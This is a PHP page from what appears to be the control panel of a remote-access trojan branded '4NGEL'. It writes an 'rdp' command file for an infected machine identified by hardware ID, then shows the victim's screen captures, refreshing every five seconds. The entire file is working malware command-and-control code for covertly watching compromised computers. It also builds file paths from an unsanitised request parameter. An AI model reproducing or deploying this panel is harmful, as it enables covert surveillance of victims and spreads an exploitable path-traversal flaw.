<?php
session_start();
if(!isset($_SESSION['id'])){
	header("Location: /");
	die();
}
if(isset($_GET['hwid'])){

	$dir = "logs".DIRECTORY_SEPARATOR.$_GET['hwid'].DIRECTORY_SEPARATOR;
	$control_dir = $dir."control".DIRECTORY_SEPARATOR;

	$rdp_path = $dir."rdp".DIRECTORY_SEPARATOR;
	$rdp_path_img = $rdp_path."rdp.jpg";

	$cmd_path = $control_dir."cmd.txt";
	$file_infos = $control_dir."infos.txt";

	if(!file_exists($file_infos)){
		header("Location: /");
		die();
	}

	file_put_contents($cmd_path, "rdp");

	if(!file_exists($rdp_path))
		mkdir($rdp_path);
?>
<!DOCTYPE html>
<html>
<head>
	<link rel="shortcut icon" href="assets/4ngel.jpg">
	<title>4NGEL - RDP</title>
	<style type="text/css">
		*{
			margin: 0;
			padding: 0;
			background-color: black;
			color: #e6e6e6;
		}
		img{
			width: 100%;
			height: 100%;
		}
	</style>
</head>
<body>
	<?php
	if(!file_exists($rdp_path_img)){
		echo "<div align='center'><br><br>Without picture</div>";
		die();
	}
	?>
	<img src="<?php echo $rdp_path_img; ?>">
</body>
</html>
<?php
	sleep(5);
	header("Refresh: 5");
	file_put_contents($cmd_path, "");
} else {
	header("Location: /");
	die();
} ?>